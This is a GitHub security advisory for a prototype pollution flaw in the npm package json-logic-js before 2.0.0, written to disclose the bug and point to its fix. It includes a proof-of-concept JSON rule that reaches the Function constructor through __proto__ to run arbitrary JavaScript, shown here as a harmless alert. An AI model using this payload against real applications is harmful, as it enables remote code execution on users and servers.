# [H] Prototype Pollution in json-logic-js

## Summary
Severity: High
Advisory: GHSA-m9hw-7xfv-wqg7
CWE: CWE-471
Ecosystem: npm
Published: 2020-11-12
Source: https://github.com/advisories/GHSA-m9hw-7xfv-wqg7
Type: github-advisory

## Affected
- npm: `json-logic-js` — affected >=0 <2.0.0

## Details
Versions of json-logic-js prior to 2.0.0 are vulnerable to Prototype Pollution. The method operation allows a malicious user to modify the prototype of Object through the method property name. This causes modification of any existing property that will exist on all objects and leads to Remote Code Execution.

The following rule creates a popup when run from a browser:
```
{
  "method": [
    {
      "method": [
        {
          "var": "__proto__.constructor.is.__proto__"
        },
        "constructor",
        [
          "var x = 'SECURITY!'; console.log(x, window.fetch); alert(x)"
        ]
      ]
    },
    "call"
  ]
}
```

## References
- https://github.com/jwadhams/json-logic-js/commit/fadfa5dc7ccd1cc5c9a1900a97a15af390bf642b
- https://www.npmjs.com/advisories/1542
- https://www.npmjs.com/package/json-logic-js
